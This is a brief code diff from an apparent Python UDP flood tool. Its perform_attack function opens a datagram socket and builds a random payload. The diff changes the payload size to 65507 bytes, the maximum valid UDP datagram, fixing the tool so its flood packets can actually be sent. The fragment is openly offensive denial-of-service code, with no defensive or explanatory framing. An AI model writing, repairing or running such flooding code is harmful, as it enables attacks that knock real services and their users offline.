@@ -35,7 +35,7 @@ def print_info():
 
 def perform_attack(ip):
     white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(88000)
+    bytes = random._urandom(65507)
     os.system("clear")
     print("Attack starting...")
     time.sleep(3)
